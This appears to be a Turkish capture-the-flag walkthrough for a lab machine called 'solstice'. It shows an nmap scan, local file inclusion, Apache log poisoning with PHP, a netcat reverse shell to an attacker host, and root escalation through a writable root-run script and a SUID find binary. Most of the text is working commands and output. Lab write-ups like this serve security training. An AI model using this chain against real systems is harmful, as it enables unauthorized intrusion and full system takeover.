@@ -1,0 +1,147 @@
+Nmap
+Bir tarama çalıştırarak başlayacağız .
+kali@kali:~$ sudo nmap -p- -sV $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-11 16:27 EDT
+Nmap scan report for $targetip
+Host is up (0.043s latency).
+Not shown: 65428 closed ports, 96 filtered ports
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         pyftpdlib 1.5.6
+22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+25/tcp    open  smtp        Exim smtpd 4.92
+80/tcp    open  http        Apache httpd 2.4.38 ((Debian))
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+2121/tcp  open  ftp         pyftpdlib 1.5.6
+3128/tcp  open  http-proxy  Squid http proxy 4.6
+8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
+54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
+62524/tcp open  ftp         FreeFloat ftpd 1.00
+Service Info: Host: solstice; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
+8593 numaralı bağlantı noktasındaki web sunucusu
+Bu web uygulaması, bize sunulan sınırlı sayıda işlevsellik ile yapım aşamasında görünüyor.
+kali@kali:~$ curl http://$targetip:8593
+<html>
+    <head>
+	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet">
+	<link rel="stylesheet" type="text/css" href="style.css">
+    </head>
+    <body>
+	<div class="menu">
+	    <a href="index.php">Main Page</a>
+	    <a href="index.php?book=list">Book List</a>
+	</div>
+We are still setting up the library! Try later on!<p></p>    </body>
+</html>
+Manuel fuzzing gerçekleştirerek, parametrede /etc/passwd book parametresinde incelememize izin veren bir LFI güvenlik açığı bulacağız .
+kali@kali:~$ curl http://$targetip:8593?book=../../../../../etc/passwd
+<html>
+    <head>
+	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet">
+	<link rel="stylesheet" type="text/css" href="style.css">
+    </head>
+    <body>
+	<div class="menu">
+	    <a href="index.php">Main Page</a>
+	    <a href="index.php?book=list">Book List</a>
+	</div>
+We are still setting up the library! Try later on!<p>root:x:0:0:root:/root:/bin/bash
+$censored /etc/passwd file
+</p>    </body>
+</html>
+
+      ####80 Bağlantı Noktasında Web Sunucusu
+Bir uygulamanın LFI güvenlik açığından başarıyla yararlandıktan sonra, 80 numaralı bağlantı noktasında çalışan web uygulamasının günlük dosyasını zehirlemeye çalışalım.
+Web uygulamasına kötü amaçlı bir PHP komutu göndererek bunu başarabiliriz.
+kali@kali:~$ echo "GET <?php echo 'TEST123' ?> HTTP/1.1" | nc $targetip 80
+HTTP/1.1 400 Bad Request
+Date: Tue, 11 Aug 2020 21:16:09 GMT
+Server: Apache/2.4.38 (Debian)
+Content-Length: 301
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</h1>
+<p>Your browser sent a request that this server could not understand.<br />
+</p>
+<hr>
+<address>Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 80</address>
+</body></html>
+Ardından, saldırımızın işe yarayıp yaramadığını doğrulamak için LFI'yi kullanacağız.
+kali@kali:~$ curl http://$targetip:8593?book=../../../../../var/log/apache2/access.log
+<html>
+    <head>
+	<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet">
+	<link rel="stylesheet" type="text/css" href="style.css">
+    </head>
+    <body>
+	<div class="menu">
+	    <a href="index.php">Main Page</a>
+	    <a href="index.php?book=list">Book List</a>
+	</div>
+We are still setting up the library! Try later on!<p>192.168.118.9 - - [11/Aug/2020:17:16:09 -0400] "GET TEST123 HTTP/1.1\n" 400 0 "-" "-"
+</p>    </body>
+</html>
+PHP kodunun yürütüldüğünü gözlemleyeceğiz. Komutları yürütmek için bunu kullanabiliriz.
+
+      ####Exploitation
+
+
+Yükümüzü enjekte etmek için zehirlenme saldırısını kullanalım.
+kali@kali:~$ echo "GET <?php system('nc -e /bin/bash $attackerip 444'); ?> HTTP/1.1" | nc $targetip 80
+İlk olarak, dinleyicimize başlayacağız.
+kali@kali:~$ sudo nc -nvlp 444
+listening on [any] 444 ...
+Ardından, LFI kullanarak yükümüzü tetikliyoruz.
+kali@kali:~$ curl http://$targetip:8593?book=../../../../../var/log/apache2/access.log
+Kabuğumuzu alıyoruz.
+kali@kali:~$ sudo nc -nvlp 444
+listening on [any] 444 ...
+connect to [$attackerip] from (UNKNOWN) [$targetip] 52810
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+python -c "import pty; pty.spawn('/bin/bash')"
+www-data@solstice:/var/tmp/webserver$
+
+www-data@solstice:/var/tmp/webserver$ stty rows 50 cols 250
+stty rows 50 cols 250
+
+Tartışma
+Çalışan işlemleri incelersek, root olarak çalışan yerel bir web sunucusu buluruz.
+www-data@solstice:/var/tmp/webserver$ ps aux
+ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+...
+root       474  0.0  0.0   2388   756 ?        Ss   Aug11   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
+...
+root       480  0.0  2.0 196744 21104 ?        S    Aug11   0:01 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
+...
+Web sunucusunun kök klasöründe, index.php dosyasının dünya çapında yazılabilir olduğunu fark edeceğiz .
+www-data@solstice:/var/tmp/webserver$ ls -l /var/tmp/sv
+ls -l /var/tmp/sv
+total 4
+-rwxrwxrwx 1 root root 36 Jun 19 00:01 index.php
+Komutları root olarak çalıştırmak için bu dosyayı kullanabiliriz. find SUID biti ile çalıştıralım .
+www-data@solstice:/var/tmp/webserver$ echo "<?php system('chmod +s /usr/bin/find'); ?>" > /var/tmp/sv/index.php
+echo "<?php system('chmod +s /usr/bin/find'); ?>" > /var/tmp/sv/index.php
+
+www-data@solstice:/var/tmp/webserver$ curl localhost:57
+curl localhost:57
+
+www-data@solstice:/var/tmp/webserver$ ls -l /usr/bin/find
+ls -l /usr/bin/find
+-rwsr-sr-x 1 root root 315904 Feb 16  2019 /usr/bin/find
+Daha sonra find'i kabuğumuzu yükseltmek için kullanabiliriz.
+www-data@solstice:/var/tmp/webserver$ find . -exec /bin/bash -p \; -quit
+find . -exec /bin/bash -p \; -quit
+bash-5.0# id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
